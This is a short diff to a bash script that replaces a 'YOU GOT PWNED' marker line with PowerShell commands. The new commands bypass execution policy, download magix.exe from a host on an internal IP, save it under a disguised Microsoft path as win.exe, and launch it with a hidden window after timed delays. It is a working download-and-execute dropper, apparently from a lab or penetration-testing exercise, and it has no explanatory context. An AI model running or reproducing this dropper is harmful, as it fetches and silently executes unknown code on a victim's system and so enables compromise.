@@ -1,2 +1,12 @@
 #!/bin/bash
-echo "YOU GOT PWNED" > /tmp/pwnd.txt
+
+sleep 5s 
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://172.26.48.122:8080/magix.exe -OutFile 'C:\ProgramData\Microsoft\win.exe'"
+
+ 
+sleep 15s
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process 'C:\ProgramData\Microsoft\win.exe' -WindowStyle Hidden" 
+ 
+
+
+
